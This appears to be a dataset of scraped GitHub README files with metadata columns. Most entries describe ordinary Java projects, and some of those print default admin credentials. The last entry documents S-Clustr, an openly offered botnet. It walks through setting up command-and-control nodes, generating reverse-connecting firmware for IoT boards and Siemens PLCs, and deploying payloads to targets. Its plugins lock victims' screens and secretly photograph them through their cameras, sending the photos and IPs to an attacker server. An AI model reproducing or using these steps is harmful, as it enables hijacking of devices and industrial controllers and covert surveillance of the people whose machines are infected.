* [JavaFX Forms Framework](https://carlfx.wordpress.com/2009/07/29/javafx-forms-framework-part-1/)",4,0,4,4.0,"['what', 'new', 'release', 'note', 'http', 'cognitive', 'quick', 'start', 'introduction', 'what', 'mvvm', 'convert', 'javafx', 'mvc', 'mvvm', 'ui', 'pattern', 'mvc', 'model', 'view', 'controller', 'mvvm', 'model', 'view', 'viewmodel', 'convert', 'javafx', 'mvc', 'form', 'ui', 'use', 'mvvm', 'pattern', 'this', 'typical', 'controller', 'without', 'use', 'view', 'model', 'use', 'validationviewmodels', 'controller', 'simpleviewmodel', 'validationviewmodel', 'how', 'inject', 'view', 'model', 'javafx', 'controller', 'demo', 'account', 'creation', 'form', 'reference']","['mvvm', 'model', 'view', 'controller', 'javafx']",1.0,"[net.nicoulaj.maven.plugins:checksum-maven-plugin,org.apache.maven.plugins:maven-assembly-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-source-plugin,org.panteleyev:jpackage-maven-plugin,org.sonatype.central:central-publishing-maven-plugin,org.sonatype.plugins:nexus-staging-maven-plugin]",0.0,1.0,0.0
sivaprasadreddy/spring-modular-monolith,main,"# spring-modular-monolith
An e-commerce application following Modular Monolith architecture using [Spring Modulith](https://spring.io/projects/spring-modulith).
The goal of this application is to demonstrate various features of Spring Modulith with a practical application.

![bookstore-modulith.png](bookstore-modulith.png)

This application follows modular monolith architecture with the following modules:

* **Common:** This module contains the code that is shared by all modules.
* **Catalog:** This module manages the catalog of products and store data in `catalog` schema.
* **Customers:** This module implements the customer management and store data in `customers` schema.
* **Orders:** This module implements the order management and store the data in `orders` schema.
* **Inventory:** This module implements the inventory management and store the data in `inventory` schema.
* **Notifications:** This module handles the events published by other modules and sends notifications to the interested parties.

**Goals:**
* Implement each module as independently as possible.
* Prefer event driven communication over direct module dependency wherever applicable.
* Store data managed by each module in an isolated manner by using different schema or database.
* Each module should be testable by loading only module-specific components.

**Module communication:**

* **Common** module is an OPEN module that can be used by other modules.
* **Orders** module invokes the **Catalog** module public API to validate the order details
* When an Order is successfully created, **Orders** module publishes **""OrderCreatedEvent""**
* The **""OrderCreatedEvent""** will also be published to external broker like RabbitMQ. Other applications may consume and process those events.
* **Inventory** module consumes ""OrderCreatedEvent"" and updates the stock level for the products.
* **Notifications** module consumes ""OrderCreatedEvent"" and sends order confirmation email to the customer.

## Prerequisites
* JDK 21
* Docker and Docker Compose
* Your favourite IDE (Recommended: [IntelliJ IDEA](https://www.jetbrains.com/idea/))

Install JDK, Gradle using [SDKMAN](https://sdkman.io/)

```shell
$ curl -s ""https://get.sdkman.io"" | bash
$ source ""$HOME/.sdkman/bin/sdkman-init.sh""
$ sdk install java 21.0.1-tem
$ sdk install gradle
$ sdk install maven
```

Task is a task runner that we can use to run any arbitrary commands in easier way.

```shell
$ brew install go-task
(or)
$ go install github.com/go-task/task/v3/cmd/task@latest
```

Verify the prerequisites

```shell
$ java -version
$ docker info
$ docker compose version
$ task --version
```

## Using `task` to perform various tasks:

The default `Taskfile.yml` is configured to use Gradle.
Another `Taskfile.maven.yml` is also created with Maven configuration.

If you want to use Maven instead of Gradle, then add `-t Taskfile.maven.yml` for the `task` commands.

For example: 

```shell
$ task test` // uses Gradle
$ task -t Taskfile.maven.yml test` //uses Maven
```

```shell
# Run tests
$ task test

# Automatically format code using spotless-maven-plugin
$ task format

# Build docker image
$ task build_image

# Run application in docker container
$ task start
$ task stop
$ task restart
```

* Application URL: http://localhost:8080 
* Actuator URL: http://localhost:8080/actuator 
* Actuator URL for modulith: http://localhost:8080/actuator/modulith
* RabbitMQ Admin URL: http://localhost:15672 (Credentials: guest/guest)
* Zipkin URL: http://localhost:9411

## Deploying on k8s cluster
* [Install kubectl](https://kubernetes.io/docs/tasks/tools/)
* [Install kind](https://kind.sigs.k8s.io/docs/user/quick-start/)

```shell
$ brew install kubectl
$ brew install kind
```

Create KinD cluster and deploy app.

```shell
# Create KinD cluster
$ task kind_create

# deploy app to kind cluster 
$ task k8s_deploy

# undeploy app
$ task k8s_undeploy

# Destroy KinD cluster
$ task kind_destroy
```
",0,1,1,1.0,"['prerequisite', 'use', 'task', 'perform', 'various', 'task', 'run', 'test', 'automatically', 'format', 'code', 'use', 'build', 'docker', 'image', 'run', 'application', 'docker', 'container', 'deploy', 'cluster', 'create', 'kind', 'cluster', 'deploy', 'app', 'kind', 'cluster', 'undeploy', 'app', 'destroy', 'kind', 'cluster']","['cluster', 'kind', 'use', 'task', 'run']",1.0,"[com.diffplug.spotless:spotless-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,1.0,0.0
Zalaya/sorting-algorithms,main,"# Sorting Algorithms in Java

This project is a collection of classic sorting algorithms implemented in Java, aimed at providing an educational resource for understanding the importance and mechanics of sorting in computer science.
",0,1,1,7.0,"['sort', 'algorithm', 'java']","['sort', 'algorithm', 'java']",1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-surefire-plugin]",0.0,1.0,0.0
Anyel-ec/SecurityMonitoring,main,"# Dynamic Database Monitoring: MongoDB, MariaDB/MySQL, PostgreSQL using React and Spring Boot

This project aims to develop an open-source tool for dynamic monitoring of three databases: **MongoDB**, **PostgreSQL**, and **MariaDB/MySQL**. The tool allows users to specify connection credentials through a web interface in **React**, and subsequently visualize customized dashboards in **Grafana** for one or several databases in a combined manner.

The backend is built with **Spring Boot** and uses **Prometheus** and **Grafana** to collect and visualize the selected database metrics.

## Project Status

This project is under development. The following has been implemented so far:
- A **React** interface for entering database connection credentials.
- **Docker Compose** integration with services for Grafana, Prometheus, and exporters for **PostgreSQL**, **MongoDB**, and **MariaDB** databases.
- Initial monitoring and visualization configuration in **Grafana**.

## Technologies Used

- **Frontend**: React (created with Vite), React Bootstrap for designing dynamic forms.
- **Backend**: Spring Boot (under development).
- **Monitoring and Visualization**: Grafana and Prometheus.
- **Databases**: MongoDB, PostgreSQL, and MariaDB.
- **Containers**: Docker and Docker Compose for service orchestration.

## Features

1. **Database Connection Configuration**:
    - Users can specify credentials to connect to **MongoDB**, **PostgreSQL**, and **MariaDB** via a dynamic form in the React app.
    - It allows the combination of different databases: for example, monitoring only **MongoDB**, **PostgreSQL**, or **MariaDB**, or combinations like **MongoDB+PostgreSQL**.

2. **Dynamic Monitoring**:
    - The backend in **Spring Boot** (upcoming development) will receive the credentials provided by the user and configure the connections to the databases.
    - Metrics are collected using **Prometheus** and visualized through **Grafana**.

3. **Visualization in Grafana**:
    - Preconfigured dashboards in **Grafana** that are activated based on the databases selected by the user.

## Project Structure

```
.
â”œâ”€â”€ frontend/                    # React Application
â”‚   â”œâ”€â”€ src/
â”‚   â”‚   â”œâ”€â”€ components/          # React Components (includes SwitchToggle, Forms, etc.)
â”‚   â”‚   â””â”€â”€ App.js               # React entry point
â”‚   â””â”€â”€ public/                  # Static files
â”œâ”€â”€ backend/                     # Upcoming: Spring Boot Backend
â”œâ”€â”€ .devcontainer/               # Development container configurations
â””â”€â”€ README.md                    # Project documentation
```

## Prerequisites

- **Docker** and **Docker Compose** installed.
- **Node.js** and **npm** installed for the React frontend.

## Installation and Usage

### 1. Clone the Repository

```bash
git clone https://github.com/Anyel-ec/SecurityMonitoring
cd SecurityMonitoring
```

### 2. Run the Frontend

```bash
cd frontend
npm install
npm run dev
```

### 3. Run the Services with Docker Compose

```bash
docker-compose up -d
```

This will launch the following services:
- **Grafana**: Accessible at `http://localhost:3000` (user: `admin`, password: `admin`).
- **Prometheus**: Accessible at `http://localhost:9090`.
- **PostgreSQL Exporter**: Accessible at `http://localhost:9187`.
- **MongoDB Exporter**: Accessible at `http://localhost:9216`.
- **MariaDB Exporter**: Accessible at `http://localhost:9104`.

### 4. Configure Grafana

1. Access **Grafana** at `http://localhost:3000`.
2. Log in using the credentials (`admin/admin`).
3. Add **Prometheus** as a data source:
   - URL: `http://prometheus:9090`.
4. Import the relevant dashboard to visualize the metrics for the configured databases.

### 5. Next Steps

The next step in development is to integrate the **Spring Boot** backend to handle dynamic database connections and automatically configure Prometheus exporters based on the credentials provided.

## Docker Compose Configuration (`docker-compose.yml`)

The `docker-compose.yml` file is configured to start the necessary services for monitoring the databases and visualizing them in Grafana. Below is the current configuration:

```yaml
version: '3'

services:
  grafana:
    image: grafana/grafana
    ports:
      - ""3000:3000""
    environment:
      GF_SECURITY_ADMIN_USER: admin
      GF_SECURITY_ADMIN_PASSWORD: admin
    volumes:
      - grafana_storage:/var/lib/grafana
    
  prometheus:
    image: prom/prometheus
    ports:
      - ""9090:9090""
    volumes:
      - ./prometheus.yml:/etc/prometheus/prometheus.yml:ro 
    
  # MongoDB Service
  mongo_db:
    image: mongo:latest
    ports:
      - ""27020:27017""
    volumes:
      - mongo_data:/data/db
  
  # MariaDB Service
  mariadb_db:
    image: mariadb:latest
    restart: always
    environment:
      MYSQL_DATABASE: ${MYSQL_DATABASE}
      MYSQL_USER: ${MYSQL_USER}
      MYSQL_PASSWORD: ${MYSQL_PASSWORD}
      MYSQL_ROOT_PASSWORD: ${MYSQL_ROOT_PASSWORD}
    ports:
      - ""3306:3306""
    expose:
      - ""3306""

  # PostgreSQL Service
  postgresql_db:
    image: postgres:latest
    volumes:
      - postgres_data:/var/lib/postgresql/data
    environment:
      POSTGRES_DB: ${POSTGRES_DB}
      POSTGRES_USER: ${POSTGRES_USER}
      POSTGRES_PASSWORD: ${POSTGRES_PASSWORD}
    ports:
      - ""5433:5432""
  
  ##############################################
  # Exporter Services
  mongo-exporter:
    image: ssheehy/mongodb-exporter:latest
    ports:
      - ""9216:9216""
    environment:
      MONGODB_URI: ""mongodb://mongo_db:27017""
    depends_on:
      - mongo_db
  
  postgres-exporter:
    image: prometheuscommunity/postgres-exporter
    ports:
      - ""9187:9187""
    environment:
      DATA_SOURCE_NAME: ""postgresql://postgres:${POSTGRES_PASSWORD}@postgresql_db:5432/${POSTGRES_DB}?sslmode=disable""
    depends_on:
      - postgresql_db

  mariadb-exporter:
    image: prom/mysqld-exporter
    depends_on:
      - mariadb_db
    command:
      - --config.my-cnf=/cfg/.my.cnf
      - --mysqld.address=192.168.0.215:3306
    volumes:
      - ""./.my.cnf:/cfg/.my.cnf""
    ports:
      - ""9104:9104""
  
volumes:
  grafana_storage:
  postgres_data:
  mongo_data:
```

## Prometheus Configuration (`prometheus.yml`)

The `prometheus.yml` file is configured to monitor services for MongoDB, PostgreSQL, and MariaDB through their respective exporters.

```yaml
global:
  scrape_interval: 5s

scrape_configs:
  - job_name: 'prometheus'
    static_configs:
      - targets: ['prometheus:9090']

  - job_name: 'postgres'
    static_configs:
      - targets: ['postgres-exporter:9187']

  - job_name: 'mongo'
    static_configs:
      - targets: ['mongo-exporter:9216']

  - job_name: 'mariadb'
    static_configs:
      - targets: ['192.168.0.215:9104']
```

## Contribution

This project is open-source, and any contributions are welcome. If you'd like to collaborate, follow these steps:

1. Fork the repository.
2. Create a new branch for your feature (`git checkout -b feature/new-feature`).
3. Commit your changes (`git commit -m 'Add new feature'`).
4. Push your branch (`git push origin feature/new-feature`).
5. Open a **Pull Request** for review.

## Project Status

This project is still under development, and some of the functionalities described are under construction.

Upcoming features include:
- Full integration with **Spring Boot**.
- Enhanced configuration and customization of **Grafana** dashboards for each database.
- Support for more databases and monitoring systems.
",0,0,3,0.0,"['dynamic', 'database', 'monitoring', 'mongodb', 'postgresql', 'use', 'react', 'spring', 'boot', 'project', 'status', 'technology', 'use', 'feature', 'project', 'structure', 'react', 'application', 'react', 'component', 'include', 'switchtoggle', 'form', 'etc', 'react', 'entry', 'point', 'static', 'file', 'upcoming', 'spring', 'boot', 'backend', 'development', 'container', 'configuration', 'project', 'documentation', 'prerequisite', 'installation', 'usage', 'clone', 'repository', 'run', 'frontend', 'run', 'service', 'docker', 'compose', 'configure', 'grafana', 'next', 'step', 'docker', 'compose', 'configuration', 'mongodb', 'service', 'mariadb', 'service', 'postgresql', 'service', 'exporter', 'service', 'prometheus', 'configuration', 'contribution', 'project', 'status']","['service', 'react', 'project', 'configuration', 'mongodb']",1.0,[org.springframework.boot:spring-boot-maven-plugin],0.0,1.0,0.0
ngud-119/Social-Network,master,"# Social-Network

Social-Network is a Stateful app built with [Spring Boot](http://spring.io/projects/spring-boot), [MySQL](https://www.mysql.com/) and [React](https://reactjs.org/).

Features:
- Routing
- User authentication: Register/Login/Logout
- 3 User Roles: Root, Admin and User
- Promoting/Demoting users to Admin/User
- Creating and deleting users
- Editing user profile
- Searching for friends
- Sending and accepting friend requests
- Removing friends from the friends list
- Adding and deleting photos
- Creating and deleting posts
- Creating and deleting comments
- Chat functionality: writing and receiving messages from your friends
- Logs history

The project is deployed on [Heroku](https://social-network-kl.herokuapp.com/).

**Admin Credentials:**
- username: john
- password: 1111

## Requirements

1. Java 11

2. In order to be able to save `Photos` you need to sign up to [Cloudinary](https://cloudinary.com/) and enter your credentials in the `application.properties` file of the Spring Boot app (`SocialNetwork\Server\src\main\resources\application.properties`)

## Start the app

### **Option 1 - Start the Client and the Server manually**

#### 1. Start the Client

To start the Client you need to enter the `SocialNetwork/Client` folder:

```bash
$ cd SocialNetwork/Client
```

Install all dependencies:

```bash
$ npm install
```

Run the app in the development mode:

```bash
$ npm start
```

Open [http://localhost:3000](http://localhost:3000) to view it in the browser.

#### 2. Start the Server

Go to the root directory of the Spring Boot app:

```bash
$ cd SocialNetwork/Server
```

Start the Server:

```bash
$ mvn spring-boot:run
```
The Server is running on port `8000`.


### **Option 2 - Start the application in Docker**

1. **Start the application**

Go to the project directory( `SocialNetwork/` ) and run:

```bash
$ docker-compose up -d
```

The front-end server will start on port `9090`. To open it enter in your browser:

```bash
$ http://localhost:9090
```
2. **Stop the application**

You can stop the containers with:

 ```bash 
 $ docker-compose down
 ```

## App screenshots

1. **Home Page**

 ![App Screenshot](readme-images/kl-social-network-home-gregor.PNG)

2. **Friends Page**

 ![App Screenshot](readme-images/kl-social-network-friends-gregor.PNG)

3. **Photos Page**

 ![App Screenshot](readme-images/kl-social-network-photos-gregor.PNG)
",0,0,1,0.0,"['requirement', 'start', 'app', 'option', 'start', 'client', 'server', 'manually', 'start', 'client', 'start', 'server', 'option', 'start', 'application', 'docker', 'app', 'screenshots']","['start', 'app', 'option', 'client', 'server']",1.0,"[maven-resources-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,1.0,0.0
MartinxMax/S-Clustr,master,"<h1 align=""center"" style=""color: #00FF00; font-family: 'Lucida Console', Monaco, monospace; text-shadow: 2px 2px 10px #FF0000, 4px 4px 20px #000000; font-size: 3em;"">
  S-Clustr (Shadow Cluster)
</h1>
<p align=""center"">
  <img src=""https://img.shields.io/badge/Java-20-darkviolet"" alt=""Java-20"" style=""margin-right: 10px;"">
  <img src=""https://img.shields.io/badge/Python-3.9-darkblue"" alt=""Python-3.9"" style=""margin-right: 10px;"">
  <img src=""https://img.shields.io/badge/Tools-Hacker_tool-darkred"" alt=""Hacker_tool"" style=""margin-right: 10px;"">
  <img src=""https://img.shields.io/badge/Team-S--H4CK13-darkmagenta"" alt=""S-H4CK13"" style=""margin-right: 10px;"">
  <img src=""https://img.shields.io/badge/Threat-APT-darkorange"" alt=""APT"" style=""margin-right: 10px;"">
  <img src=""https://img.shields.io/badge/Category-IOT-darkgrey"" alt=""IOT"" style=""margin-right: 10px;"">
  <img src=""https://img.shields.io/badge/Category-OT-darkgrey"" alt=""OT"" style=""margin-right: 10px;"">
  <img src=""https://img.shields.io/badge/Category-IT-darkgrey"" alt=""IT"" style=""margin-right: 10px;"">
  <img src=""https://img.shields.io/badge/Threat-Botnet-darkred"" alt=""Botnet"" style=""margin-right: 10px;"">
  <img src=""https://img.shields.io/badge/Brand-Siemens(PLC)-darkblue"" alt=""Siemens-PLC"" style=""margin-right: 10px;"">
</p>



![alt text](./pic/H4CK.png)


# Security Update Announcement

**Version:** 3.2  
**Date:** 2024/8/9

---

Dear Users,

We wish to inform you about a critical security vulnerability found in versions of **S-Clustr (RingNetwork)** up to and including version 3.1 (excluding the Simple version). This vulnerability involves a high-risk encoding attack that can severely impact botnet nodes by causing disconnections, leading to potential system instability.

## Vulnerability Details:

- **Issue:** High-risk encoding attack vulnerability
- **Affected Versions:** S-Clustr (RingNetwork) <= 3.1 (excluding Simple version)
- **Impact:** Disconnection of botnet nodes and potential system instability

## Resolution:

The issue has been effectively addressed and resolved in version 3.2. We strongly recommend that all users upgrade to this version to prevent disconnections and ensure system stability.

## Upgrade Instructions:

1. **Download** the latest version from [GitHub Releases](https://github.com/MartinxMax/S-Clustr/releases).
2. **Follow the installation instructions** provided in the documentation to complete the update.

---

![Update Image](./pic/V3.2.png)

# Overview

| **No.** | **Feature Description** |
|:-------:|:------------------------:|
| **1**  | Dual-key encryption & pseudo-protocol transmission |
| **2**  | Anonymous mode for node access |
| **3**  | Defense against replay attacks from other hackers |
| **4**  | Decentralized, where each server can act as a root node (child nodes can join the network using a ring key), with up to 50,000 controlled devices per node |
| **5**  | Ring network circle (a club of zombie networks) |
| **6**  | Efficient handling of high-concurrency traffic |
| **7**  | Support for multiple device types (personal computers/IT devices, IOT devices, OT devices) |
| **8**  | Reverse connection support for multiple programming languages (C, C++, Go, Python, Java, etc., with network communication capabilities) |






## Devices

| **Type**  | **Device**         | **LAN** | **Wireless** | **4G** |
|-----------|--------------------|---------|--------------|--------|
| **IOT**   | Arduino            | âˆš       | Ã—            | âˆš      |
| **IOT**   | Hezhou AIR780e     | Ã—       | Ã—            | âˆš      |
| **IOT**   | ESP8266            | Ã—       | âˆš            | Ã—      |
| **IOT**   | AT89C51            | Ã—       | Ã—            | âˆš      |
| **IOT**   | STM32              | Ã—       | Ã—            | âˆš      |
| **OT/PLC**| SIEMENS S7-1200   | âˆš       | Ã—            | Ã—      |
| **OT/PLC**| SIEMENS S7-200    | âˆš       | Ã—            | Ã—      |
| **IT**    | PC                 | âˆš       | âˆš            | Ã—      |




# Install

`$ cd ./install`

Choose the appropriate installer based on your operating system.

![alt text](./pic/install.png)

## Windows

`> Windows.bat`

![alt text](./pic/Windows_install.png)

## Linux

`$ chmod +x ./Linux.sh`

`$ ./Linux.sh`

![alt text](./pic/Linux_install.png)

# Core Concepts

## Dual Key Authentication & Constructing Pseudo Protocols

![alt text](./pic/image.png)

S-Clustr (Shadow Cluster) introduces the concept of dual-key authentication in version 3.0.

![alt text](./pic/image-2.png)

By encrypting data, it ensures the data security of anonymous connections.

![alt text](./pic/image-3.png)

## Decentralized & Distributed Control

![alt text](./pic/image-4.png)

![alt text](./pic/image-6.png)

In the diagram, each server can become a root node. To join nodes, we need to provide a ring network key to join this Club. When connecting to the Root node server, you will have the highest control authority over all devices within the included nodes. However, to protect node security, you need to provide the node key (not everyone will trust you without reservation).

# Ring Network Formation

# Overview

In practice, no more than 2 devices are required (of course, the more machines that join your Club, the more you can do). If you are a server, it is entirely feasible.

# Server

`$ java -jar s_clustr-server-3.0.jar -h`

![alt text](./pic/image-9.png)

### Root Node Server

Regardless of whether you are on Windows or Linux, you can deploy the server.

`$ java -jar s_clustr-server-3.0.jar -nkey whoami123 -rkey h4ck13io`

Node key: whoami123
Ring key: h4ck13io

![alt text](./pic/image-8.png)

### Child Node Server

Windows2:

`$ java -jar s_clustr-server-3.0.jar -nkey FVckG4me -rkey h4ck13io -rootip 192.168.8.107`

Join the ring network, becoming a node.

Node key: FVckG4me
Ring key: h4ck13io

![alt text](./pic/image-10.png)

For testing, another child node needs to be added.

Windows:

`$ java -jar s_clustr-server-3.0.jar -nkey OPOPOPOP -rkey h4ck13io -rootip 192.168.8.107`

Node key: OPOPOPOP
Ring key: h4ck13io

![alt text](./pic/image-11.png)

![alt text](./pic/image-7.png)

# Anonymous Client

`$ java -jar s_clustr-client-3.0.jar`

![alt text](./pic/image-12.png)

Configure `set root-host`, `set node-key`, `set ring-key` information.

`[S-H4CK13@S-Clustr]<3.0># init`

Initialize and try to connect to the Root server.

![alt text](./pic/image-13.png)

After a successful connection, a root node identifier will appear.

## Retrieve Root Node Device Status

Ensure you are in the root node device status.

`[S-H4CK13@S-Clustr]<3.0>@000C29EC84FE# set pwr 0`

`[S-H4CK13@S-Clustr]<3.0>@000C29EC84FE# set pwr 3`

![alt text](./pic/image-14.png)

## Retrieve Child Node Status

In root node status, enter the `getinfo` command to retrieve the status of all nodes.

![alt text](./pic/image-15.png)

## Enter Node

In root node status, enter the `goto <Node ID>` command to enter the node. Enter the `exit` command to exit the current node.

![alt text](./pic/image-16.png)

## Node Device Control

Determine the current node location and choose to set the pwr parameter behavior [1. Start 2. Stop 3. Status query]

![alt text](./pic/image-18.png)

![alt text](./pic/image-20.png)

![alt text](./pic/image-19.png)

Control must be confirmed with the correct node key for the current node where you are controlling.

![alt text](./pic/image-21.png)

Node server:

![alt text](./pic/image-22.png)

Simulated controlled client:

![alt text](./pic/image-23.png)

Similarly, you can specify the type to stop using the `set type ` parameter.

![alt text](./pic/image-25.png)


# S-Clustr IOT


## Wired LAN Control

### Arduino

1.Arduino UNO

![H4CK13](https://image.3001.net/images/20231003/1696319500_651bc80cd29c5e6f7d8d1.png!small)

2.ENC28J60

![H4CK13](https://image.3001.net/images/20231004/1696404809_651d15491408ad4740661.png!small)

3.1-Channel Relay Module 5V

![H4CK13](https://image.3001.net/images/20231003/1696320112_651bca7049ff6d0cfd7c8.png!small)

4.Dupont Wires

![H4CK13](https://image.3001.net/images/20231003/1696320323_651bcb43ea727fb6119ef.png!small)

### Wiring Diagram

![H4CK13](https://image.3001.net/images/20231004/1696404864_651d15804a8adde1b9379.png!small)

![H4CK13](https://image.3001.net/images/20231004/1696404881_651d1591885762a52c1a9.png!small)

## 4G Wireless Public Network Remote Control

### Arduino

1.Arduino UNO

![H4CK13](https://image.3001.net/images/20231003/1696319500_651bc80cd29c5e6f7d8d1.png!small)

2.SIM900A or SIM800A

![H4CK13](https://image.3001.net/images/20231003/1696320095_651bca5fdbb3a6a2b1941.png!small)

2.1-Channel Relay Module 5V

![H4CK13](https://image.3001.net/images/20231003/1696320112_651bca7049ff6d0cfd7c8.png!small)

3.Dupont Wires

![H4CK13](https://image.3001.net/images/20231003/1696320323_651bcb43ea727fb6119ef.png!small)

4.4G SIM Card

*The mobile SIM card is needed because the SIM800A and SIM900A modules support 2G networks from Mobile but not from Telecom or Unicom. However, after testing, the Airm2m AIR780e module should work with Unicom, so there will be no need for SIM series modules as it has internal integration.*

![H4CK13](https://image.3001.net/images/20231003/1696322442_651bd38a673737e609e44.png!small)

### Wiring Diagram

![H4CK13](https://image.3001.net/images/20231003/1696321543_651bd0070660a10028e00.png!small)

### AIR780E [recommend]

1.After testing, this development board is indeed faster and more stable than the SIM series.
2.Install Luatools: Used for completing program flashing

[https://doc.openluat.com/wiki/37?wiki\_page\_id=4489]


1.Air780e

*There is a SIM card slot on the back.*

![H4CK13](https://image.3001.net/images/20231014/1697255772_652a115c4d9c45ee325b8.png!small)

![H4CK13](https://image.3001.net/images/20231014/1697256035_652a1263e9098b9a5a733.png!small)

2.1-Channel Relay Module 5V

![H4CK13](https://image.3001.net/images/20231003/1696320112_651bca7049ff6d0cfd7c8.png!small)

3.Dupont Wires

![H4CK13](https://image.3001.net/images/20231003/1696320323_651bcb43ea727fb6119ef.png!small)

### Wiring Diagram

![H4CK13](https://image.3001.net/images/20231014/1697256413_652a13ddced9ee29cc759.png!small)

### Flash

*Import the file we generated with Generate into Luatools.*

![H4CK13](https://image.3001.net/images/20231014/1697256986_652a161a395cbe1d00004.png!small)

*Select the underlying core. The file is provided in our Output\AIR780E\LuatOS-SoC_V1103_EC618.soc*

![H4CK13](https://image.3001.net/images/20231014/1697257233_652a1711a164adde8dc73.png!small)

*Follow the prompts to complete the flashing process. Note the three buttons on the board: Start, Reset, and BOOT.*

![H4CK13](https://image.3001.net/images/20231014/1697257441_652a17e10a6eb5ce11d70.png!small)

### AT89C51


1.51 Microcontroller & CH340 Programmer

![H4CK13](https://image.3001.net/images/20231016/1697385869_652c0d8d827cba5a5f0b6.png!small)

2.1-Channel Relay Module 5V

![H4CK13](https://image.3001.net/images/20231003/1696320112_651bca7049ff6d0cfd7c8.png!small)

3.Dupont Wires

![H4CK13](https://image.3001.net/images/20231003/1696320323_651bcb43ea727fb6119ef.png!small)

4.SIM900A or SIM800A

![H4CK13](https://image.3001.net/images/20231003/1696320095_651bca5fdbb3a6a2b1941.png!small)

5.4G SIM Card

![H4CK13](https://image.3001.net/images/20231003/1696322442_651bd38a673737e609e44.png!small)

### Wiring Diagram

![H4CK13](https://image.3001.net/images/20231016/1697386548_652c1034eb77af75eea6b.png!small)

## WIFI

### ESP8266


1.ESP8266

![H4CK13](https://image.3001.net/images/20231005/1696496352_651e7ae0eadb3f502abd5.png!small)

2.1-Channel Relay Module 5V

![H4CK13](https://image.3001.net/images/20231003/1696320112_651bca7049ff6d0cfd7c8.png!small)

3.Dupont Wires

![H4CK13](https://image.3001.net/images/20231003/1696320323_651bcb43ea727fb6119ef.png!small)

### Wiring Diagram

![H4CK13](https://image.3001.net/images/20231005/1696496713_651e7c4961e1f66469f91.png!small)



# Generate.py Device Firmware Code

`$ python3 generate.py`

![alt text](./pic/generate.png)

Reverse S-Clustr Server IP.

![alt text](./pic/generate2.png)

Generate code in the corresponding directory:./Device/Output/arduino

# S-Clustr OT

## SIEMENS S7-1200

Open the `./device/output/SIEMENS-PLC-S7-1200/Main` project using TIA software, and configure the IP and port for our reverse S-Clustr.

![image.png](https://image.3001.net/images/20231116/1700064368_6554ec700ef08120c4bc0.png!small)

![image.png](https://image.3001.net/images/20231116/1700064386_6554ec8260cd410d68837.png!small)

![image.png](https://image.3001.net/images/20231116/1700064514_6554ed02623a5f958fb2c.png!small)

# S-Clustr IT

# Plugin

## H4vdo (Hacker Voodoo)

![alt text](./pic/H4vdo.jpeg)

### Overview

H4vdo is an S-Clustr plugin that allows batch control of malicious screen casting services through a shadow cluster. It locks device-side operations and plays streaming video (live streams, MP4s, desktop casting) without causing significant data loss or damage to the system.

You can download the standalone tool (non-plugin version) from the repository at https://github.com/MartinxMax/H4vdo.

## RTMP Server

`$ python3 generate.py`
`[Device Type (Number)]> 7`
`[+] [0] Start RTMP server [1] Skip> 0`

![alt text](./pic/generate_RTMP.png)

### RTMP Payload

`$ python3 generate.py`
`[Device Type (Number)] > 7`
`[+] [0] Start RTMP server [1] Skip > 1`
`[+] RTMP server IP > 192.168.8.106`
`[+] RTMP server PORT > 1935`
`[+] Play key > hacked`
`[+] What is the version of python you want to execute?([0]python [1]python3)> 0`
`[+] [0] Generate payload [1] Push RTMP stream > 0`

![alt text](./pic/RTMP_PUST.png)

### RTMP Stream Push

`$ python3 generate.py`
`[Device Type (Number)] > 7`
`[+] [0] Start RTMP server [1] Skip> 1`
`[+] RTMP server IP > 192.168.8.106`
`[+] RTMP server PORT > 1935`
`[+] Play key > hacked`
`[+] What is the version of python you want to execute?([0]python [1]python3)> 0`
`[+] [0] Generate payload [1] Push RTMP stream > 1`
`[0] Push media mp4 [1] Push desktop screen [2] Push camera> 0`
`MP4 file path: xxxx.mp4`

![alt text](./pic/MP4.png)

### Example

1.Customize and modify ./demo/H4vdo/H4vdo_demo.py to update the server IP and port for the S-Clustr.
2.Click H4vdo_demo_generate.bat to package it into an executable file.
3.Place ./demo/H4vdo/H4vdo_demo.exe into the generated ./device/output/H4vdo/H4vdo_debug folder, and finally upload the entire folder to the target.

When executing H4vdo_demo.exe, the shadow cluster will first receive a reverse connection.

`SHELL> ./H4vdo_demo.exe`

![alt text](./pic/H4vdo_demo.png)

*Query Status*

`[S-H4CK13@S-Clustr]<3.0>@000C29EC84FE# set pwr 3`
`[S-H4CK13@S-Clustr]<3.0>@000C29EC84FE# set id 0`
`[S-H4CK13@S-Clustr]<3.0>@000C29EC84FE# run`

![alt text](./pic/Status.png)

*Run Payload*

`[S-H4CK13@S-Clustr]<3.0>@000C29EC84FE# set pwr 1`
`[S-H4CK13@S-Clustr]<3.0>@000C29EC84FE# set id 1`
`[S-H4CK13@S-Clustr]<3.0>@000C29EC84FE# run`

![alt text](./pic/RTMP_Run.png)

Stream playback on the host screen

![alt text](./pic/RTMP_Player.png)

## Nets3e

![alt text](./pic/Nets3e.jpeg)

### Overview

Nets3e is an S-Clustr plugin primarily used for camera photography and IP acquisition. When you connect to the shadow cluster, you can batch control hosts, issue commands to devices under sub-nodes, and send captured photos and IP addresses to the Nets3e server for espionage activities.

Nets3e itself has another independently constructed pseudo-protocol encryption, which means that Nets3e can also be regarded as a standalone espionage tool.

You can download the standalone tool (non-plugin version) from the repository at https://github.com/MartinxMax/Nets3e.

### Nets3e Server

`$ python3 generate.py`
`[Device Type (Number)]>6`
`[+] Nets3e Server IP >192.168.8.106`
`[+] Nets3e Server Port >10099`
`[+] Nets3e Salt(password) >Maptnh`
`[+] Frp or Ngrok Server IP(default blank) >`
`[+] Frp or Ngrok Server Port(default blank)>`
`[+] Enable DingTalk Push?[./plugin/Nets3e/DingTalk.conf](y/n) >n`
`[+] Let the victim see their own photos?(y/n) >y`
`[+] What is the version of python you want to execute?([0]python [1]python3) >1`
`[+] What you need to do?([0]only generate payload [1]only start server [2]generate and start server [3]exit)>1`

![alt text](./pic/Nets3e_Server.png)


### Nets3e Payload

In `./plugin/Nets3e/GETIP.conf`, you need to ensure that the API endpoint for obtaining the public IP is functional. The returned result must be a plain text IP address.

![alt text](./pic/Nets3e_Payload_config.png)

`[Device Type (Number)]>6`
`[+] Nets3e Server IP >192.168.8.106`
`[+] Nets3e Server Port >10099`
`[+] Nets3e Salt(password) >Maptnh`
